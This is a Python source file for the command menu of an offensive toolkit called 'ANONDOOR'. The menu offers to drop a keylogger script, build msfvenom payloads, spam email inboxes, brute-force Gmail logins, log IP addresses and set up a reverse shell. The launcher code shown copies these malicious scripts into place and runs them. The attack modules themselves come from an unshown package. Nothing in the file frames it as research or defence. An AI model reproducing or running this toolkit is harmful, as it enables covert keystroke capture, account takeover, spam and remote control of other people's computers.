import sys
import os
import time
import colorsys
from source import ftp, iplogger, bruteforceEmail
from colorama import Fore


def menu(): 
    try:
        logo = Fore.CYAN + """
    ▄▄▄       ███▄    █  ▒█████   ███▄    █ ▓█████▄  ▒█████   ▒█████   ██▀███  
    ▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
    ▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
    ░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  
    ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
    ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
    ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
    ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░ 
        ░  ░         ░     ░ ░           ░    ░        ░ ░      ░ ░     ░     
                                            ░  Cyber Phantom                   """ + Fore.RESET
        
        os.system("clear")
        print(logo,"Plataforma: " + str(sys.platform), "\n Version de python: " + str(sys.version))
        f = str(input(Fore.BLUE + "ANONDOOR~: " + Fore.YELLOW))

        while(True):
            if f == "exit" or f == "salir":
                print(Fore.RESET)
                sys.exit()
            if f == "-h" or f == "--help":
                help()
                break
                
            if f == "cyberftp":    
                ft2 = Fore.CYAN + str(ftp.connect_ftp())
                sys.exit()
            if f == "iplogger":
                print(Fore.RESET)
                iplogger.ip()
            
            if f == "payload":
                from source import payload
            
            if f == "keylogger":
                directorio = str(os.system("pwd > /dev/null 2>&1"))
                if os.path.exists(path="keylogger.py"):
                    os.remove(path="keylogger.py")
                    os.system("cp source/key.py '{0}'".format(directorio))
                    time.sleep(1)
                    os.system("mv 0 keylogger.py")
                    if os.path.exists(path="keylogger.py"):
                        print("Keylogger reescrito correctamente")
                        sys.exit()
                    else:
                        print("hubo un error al reescribir keylogger")
                else:
                    os.system("cp source/key.py '{0}'".format(directorio))
                    time.sleep(1)
                    os.system("mv 0 keylogger.py")
                    if os.path.exists(path="keylogger.py"):
                        print("\nKeylogger creado correctamente\n" + Fore.RESET)
                        sys.exit()
                    else:
                        print("hubo un error al crear keylogger")
            if f == "spammail":
                from source import cybersendmail
            if f == "brutemail":
                print(Fore.RESET) 
                bruteforceEmail.brute()

            if f == "reverse" or f == "reverse shell":
                a = input(Fore.RESET + "Desea crear la shell de reversa? Y/n: ")

                if a == "Y" or a == "y":
                    directorio = str(os.system("pwd > /dev/null 2>&1"))
                    os.system("cp source/cliente.py {0} ".format(directorio))
                    os.system("mv 0 cliente.py")
                    if os.path.exists(path="cliente.py"):
                        print(Fore.GREEN + "\nShell de Reversa, creada correctamente\n" + Fore.RESET)
                        from source import reverse
                    else:
                        print("Hubo un error al crear la Shell de Reversa, Por favor verifique.\n")

                elif a == "N" or a == "n":
                    print("\n")
                    from source import reverse
                else:
                    print(Fore.RED + "\nPor favor, de una respuesta valida\n")
                    
            else:
                if f == "":
                    return Fore.YELLOW + str(menu())
                else:
                    print(Fore.RED + "-->parametro incorrecto!" + Fore.RESET)
                    time.sleep(0.3)
                    return Fore.YELLOW + str(menu())

    except KeyboardInterrupt:
        print(Fore.CYAN + "\n\nNos " + Fore.GREEN + "vemos " + Fore.YELLOW +"pronto! :)\n" + Fore.RESET)
        sys.exit()

def help():
    print( Fore.WHITE + """
--------------------------------------------------------------------------
#        exit (salir)                                                    «
#                                                                        «
#        salir (salir)                                                   «
#                                                                        «
#        -h --help (ayuda)                                               «
#                                                                        «
#        cyberftp (Conectarse Via FTP a un HOST)                         «
#                                                                        «
#        keylogger (crea un keylogger escrito en python)                 «
#                                                                        «
#        iplogger (Ejecuta un iplogger escrito en python)                «
#                                                                        «
#        payload (Crea un payload con msfvenom)                          «                                                                                           
#                                                                        «                                                                                           
#        spammail (Usa esto para diversion, herramienta de spam a Emails)«                                                                                           
#                                                                        «                                                                                           
#        brutemail (herramienta de fuerza bruta a Gmail)                 «                                                                                           
#                                                                        «                                                                                           
#        reverse (escuchar  y crear reverse shell hecha en python)       «                                                                                           
--------------------------------------------------------------------------                                                                                           
                                                                                                                                                                     
        """ + Fore.RESET)
        

if __name__ == "__main__":
    menu()




     
     
            
     

